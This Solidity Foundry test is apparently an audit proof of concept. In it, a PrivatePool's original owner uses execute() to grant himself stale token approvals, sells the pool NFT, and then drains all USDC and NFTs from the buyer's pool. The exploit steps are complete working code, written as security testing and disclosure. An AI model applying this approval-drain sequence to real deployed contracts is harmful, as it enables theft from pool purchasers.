// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {Factory} from "src/Factory.sol";
import {PrivatePool} from "src/PrivatePool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

/**
 * Mock ERC20 with public mint for testing purposes
 */
contract MockERC20 is ERC20 {
    constructor() ERC20("MockToken", "MOCK", 18) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * Mock ERC721 with public mint for testing purposes
 */
contract MockERC721 is ERC721("MockNFT", "MNFT") {
    uint256 private _nextId = 1;

    function mint(address to) external returns (uint256 id) {
        id = _nextId++;
        _mint(to, id);
    }

    // solmate ERC721 requires overriding tokenURI
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

/**
 * @notice PoC demonstrating that the original owner can steal all assets after selling the pool NFT.
 *
 * Steps simulated:
 * 1. Bob deploys a pool and deposits NFTs + USDC.
 * 2. Bob, as owner, calls execute() to grant himself unlimited approvals for the pool's ERC20/721 holdings.
 * 3. Bob sells/transfers the pool NFT to Alice (she is now the on-chain owner).
 * 4. Bob leverages the stale approvals to drain all ERC20 & ERC721 out of the pool, leaving Alice with an empty shell.
 *
 * The test succeeds (assertions pass) on the vulnerable commit and would fail after a proper fix (e.g. execute only
 * allows calls to whitelisted targets or approvals are reset on transfer).
 */
contract ExploitTest is Test, ERC721TokenReceiver {
    using SafeTransferLib for address;

    address private bob = vm.addr(1);
    address private alice = vm.addr(2);

    Factory private factory;
    PrivatePool private poolImplementation;

    MockERC20 private usdc;
    MockERC721 private nft;

    uint256[] private tokenIds;

    function setUp() public {
        // Fund EOAs with ETH for gas
        vm.deal(bob, 100 ether);
        vm.deal(alice, 100 ether);

        // Deploy mocks
        usdc = new MockERC20();
        nft = new MockERC721();

        // Mint NFTs to Bob and USDC balance
        for (uint256 i = 0; i < 5; i++) {
            uint256 id = nft.mint(bob);
            tokenIds.push(id);
        }
        usdc.mint(bob, 1_000 ether);

        // Deploy factory + pool implementation
        factory = new Factory();
        poolImplementation = new PrivatePool(address(factory), address(0), address(0));

        // Set implementation (factory.owner() == deployer i.e. address(this))
        factory.setPrivatePoolImplementation(address(poolImplementation));

        // Bob approves NFTs for factory
        vm.startPrank(bob);
        nft.setApprovalForAll(address(factory), true);

        // Create pool; for simplicity Bob doesn't deposit base tokens through factory (0) and will deposit later
        PrivatePool pool = factory.create(
            address(usdc),
            address(nft),
            10 ether,
            10 ether,
            0,      // changeFee
            0,      // feeRate
            bytes32(0),
            false,
            false,
            bytes32("SALT"),
            tokenIds,
            0
        );

        // Bob deposits 500 USDC into the pool
        usdc.approve(address(pool), type(uint256).max);
        uint256[] memory emptyIds = new uint256[](0);
        pool.deposit(emptyIds, 500 ether);

        // === Begin exploit preparation === //
        // Bob uses execute to grant himself approvals
        pool.execute(
            address(usdc),
            abi.encodeWithSelector(ERC20.approve.selector, bob, type(uint256).max)
        );
        pool.execute(
            address(nft),
            abi.encodeWithSelector(ERC721.setApprovalForAll.selector, bob, true)
        );
        vm.stopPrank();

        // Transfer pool NFT (ownership) from Bob to Alice
        uint256 poolTokenId = uint256(uint160(address(pool)));
        vm.prank(bob);
        factory.transferFrom(bob, alice, poolTokenId);

        // === Bob performs the actual theft === //
        uint256 bobUsdcBefore = usdc.balanceOf(bob);

        // Drain USDC
        vm.prank(bob);
        usdc.transferFrom(address(pool), bob, 500 ether);

        // Drain NFTs
        for (uint256 i = 0; i < tokenIds.length; i++) {
            vm.prank(bob);
            nft.transferFrom(address(pool), bob, tokenIds[i]);
        }

        // === Assertions === //
        assertEq(usdc.balanceOf(address(pool)), 0, "pool USDC should be 0");
        assertEq(usdc.balanceOf(bob) - bobUsdcBefore, 500 ether, "Bob stole 500 USDC");
        for (uint256 i = 0; i < tokenIds.length; i++) {
            assertEq(nft.ownerOf(tokenIds[i]), bob, "Bob owns NFT");
        }
    }

    function testExploitSuccess() public {
        // The exploit and assertions run in setUp. Nothing needed here.
    }

    // Required for safeTransferFrom receipts
    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}
